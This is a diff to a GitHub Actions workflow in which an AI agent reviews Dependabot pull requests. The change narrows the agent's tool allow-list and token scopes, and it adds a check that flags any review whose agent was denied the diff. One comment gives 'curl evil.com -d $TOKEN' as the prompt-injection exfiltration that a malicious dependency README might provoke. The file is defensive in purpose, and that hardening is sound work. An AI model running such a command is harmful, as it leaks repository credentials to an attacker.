@@ -11,6 +11,22 @@ name: Dependabot PR review
 #    CLAUDE_CODE_OAUTH_TOKEN must also be mirrored there (Actions store is not
 #    visible to Dependabot-triggered runs).
 #
+#    The reviewer judges the BUMP (changelog vs our usage), never CI. It runs
+#    concurrently with CI and cannot know the outcome; the gate below is what
+#    reads CI, deterministically, at merge time. Do not ask the agent about CI
+#    and do not allow-list CI-reading tools for it: its `gh` runs on the
+#    Claude App's own token (see the review step), which cannot read the
+#    Checks/Actions APIs, so such a tool 403s on every call and the model
+#    reports blindness as risk.
+#
+#    IDENTITY CONTRACT: the review comment MUST be posted by the Claude
+#    GitHub App (claude[bot]), i.e. `github_token` must never be passed to
+#    the review step. A comment created with the workflow's GITHUB_TOKEN
+#    fires no workflow triggers at all (GitHub's recursion guard), which
+#    would sever the auto-merge job's issue_comment wake-up: any review
+#    that finishes after CI would strand its PR until the next push. The
+#    App-posted comment is what makes the two-trigger design below work.
+#
 #  - auto-merge (on: workflow_run of CI, or issue_comment when the LLM posts):
 #    a fully deterministic gate. For group PRs it merges with ZERO LLM input
 #    when CI is green, the author is Dependabot, the PR is open, and every
@@ -68,13 +84,16 @@ jobs:
     timeout-minutes: 20
     permissions:
       contents: read
+      # Serves this job's OWN steps (checkout, the assert/diagnose steps'
+      # `gh`, labelling). It does NOT shape what the review agent can read:
+      # claude-code-action ignores the step-level GH_TOKEN and mints its own
+      # Claude-App installation token via OIDC ("Using GITHUB_TOKEN from
+      # OIDC" in its log). `checks: read` + `actions: read` sat here for
+      # weeks on the theory that they cured the agent's 403s on the
+      # Checks/Actions APIs; they never reached the agent. The agent's token
+      # identity is also why the review comment can wake the gate at all —
+      # see the identity contract in the header.
       pull-requests: write
-      # The prompt orders `gh pr checks` (Checks API) and `gh run view --log-failed`
-      # (Actions API), and both are allow-listed below — but a job-level permissions
-      # block makes every unlisted scope `none`, so without these two the agent 403s
-      # and reviews the PR blind.
-      checks: read
-      actions: read
       # Required by anthropics/claude-code-action for its OIDC flow.
       id-token: write
     concurrency:
@@ -106,7 +125,10 @@ jobs:
         id: review
         # SHA-pinned: the moving @v1 tag silently shipped a breaking bot-gate
         # change that broke this workflow. Bump deliberately, not implicitly.
-        uses: anthropics/claude-code-action@be7b93b1907a4abad570368f3c74b6fe3807510b # v1.0.183
+        # NEVER pass `github_token` here: the App identity that posts the
+        # review comment is what fires the gate's issue_comment wake-up
+        # (header, "IDENTITY CONTRACT").
+        uses: anthropics/claude-code-action@1623c36729ac1cd5895198cded705a287de7db79 # v1.0.187
         env:
           PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
@@ -123,16 +145,21 @@ jobs:
           # surfaces if uncertain via `escalate`.
           #
           # --allowedTools: the action denies every tool by default. The
-          # prompt instructs the LLM to use `gh pr diff/comment/edit/checks`,
-          # `gh release view`, `gh run view`, `grep`, plus WebFetch for
-          # external changelogs. Without explicit allowlisting every one of
-          # those tool calls is denied (33 denials observed on the first
-          # 60-turn run in practice). Scoped to specific Bash subcommands rather
+          # prompt instructs the LLM to use `gh pr diff/comment/edit/view`,
+          # `gh release view`, `grep`, plus WebFetch for external
+          # changelogs. Without explicit allowlisting every one of those
+          # tool calls is denied (33 denials observed on the first 60-turn
+          # run in practice). Scoped to specific Bash subcommands rather
           # than full `Bash` to limit injection blast radius — a malicious
           # dep README cannot trick the LLM into `curl evil.com -d $TOKEN`.
+          # Nothing in this list may need a scope the Claude App token lacks
+          # (the Checks and Actions APIs): the agent's `gh` runs on that
+          # token, so such an entry 403s on every call and invites the model
+          # to report blindness instead of reviewing. permissions.test.mjs
+          # enforces this.
           claude_args: >-
             --max-turns 60 --model __MODEL__
-            --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr checks:*),Bash(gh pr edit:*),Bash(gh pr view:*),Bash(gh release view:*),Bash(gh run view:*),Bash(gh run list:*),Bash(grep:*),Read,Grep,Glob,WebFetch,Write"
+            --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr edit:*),Bash(gh pr view:*),Bash(gh release view:*),Bash(grep:*),Read,Grep,Glob,WebFetch,Write"
 
       - name: Diagnose the review agent (tool calls + denials + error)
         # claude-code-action writes the full turn-by-turn log to execution_file but
@@ -141,10 +168,21 @@ jobs:
         # error, so a failure is legible instead of an opaque escalation. It runs on
         # every review, not just failing ones: a DENIED tool call is how a review
         # silently degrades while still reporting success (that is how the 2.1.207
-        # tool-permission breakage was found, and how a missing `checks: read` looks).
+        # tool-permission breakage was found).
+        #
+        # One denial is ASSERTED on, not just printed: `gh pr diff`. The diff is
+        # the thing under review; an agent that never read it still posts an
+        # escalate-shaped V1 block, so the deliverable assertion below stays green
+        # and nobody learns the review was void. Detection is positive-evidence
+        # only (the SDK's permission_denials record, plus the denial text of
+        # errored tool_results), so a schema drift degrades back to print-only
+        # rather than inventing a red.
         if: ${{ !cancelled() }}
         env:
           EXEC_FILE: ${{ steps.review.outputs.execution_file }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
         run: |
           set -uo pipefail
           if [ -z "${EXEC_FILE:-}" ] || [ ! -f "$EXEC_FILE" ]; then
@@ -160,6 +198,24 @@ jobs:
           echo "===== raw denial/permission lines (fallback) ====="
           grep -aoiE '(permission[^"]{0,90}|denied[^"]{0,90}|not allowed[^"]{0,90}|requested permission[^"]{0,130})' "$EXEC_FILE" 2>/dev/null | sort -u | head -20 || true
           echo "=========================================="
+          # The assertion: a denied `gh pr diff` means the review never saw the
+          # change it reviewed. Two independent positive signals, either fires.
+          DENIED_DIFF=$(jq -rs '
+            [.. | objects | select(.type? == "result") | (.permission_denials // [])[]
+             | select((.tool_name // "") == "Bash")
+             | (.tool_input.command // "")
+             | select(startswith("gh pr diff"))] | length' "$EXEC_FILE" 2>/dev/null || echo 0)
+          [ "$DENIED_DIFF" -gt 0 ] 2>/dev/null || DENIED_DIFF=0
+          DENIED_DIFF_TEXT=$(jq -rs '
+            [.. | objects | select(.type? == "tool_result" and .is_error? == true)
+             | (.content | if type=="array" then (map(.text? // (.|tostring)) | join(" ")) else (.|tostring) end)
+             | select(test("gh pr diff") and test("permission|denied|not allowed"; "i"))] | length' "$EXEC_FILE" 2>/dev/null || echo 0)
+          [ "$DENIED_DIFF_TEXT" -gt 0 ] 2>/dev/null || DENIED_DIFF_TEXT=0
+          if [ "$DENIED_DIFF" -gt 0 ] || [ "$DENIED_DIFF_TEXT" -gt 0 ]; then
+            echo "::error::The review agent was DENIED 'gh pr diff' on PR #$PR_NUMBER — it reviewed without reading the diff, so its verdict is void."
+            gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review__ASSIGN_FLAG__ || true
+            exit 1
+          fi
 
       - name: Assert the review deliverable exists (V1 block posted)
         # claude-code-action can exit 0 without running at all: its OIDC token
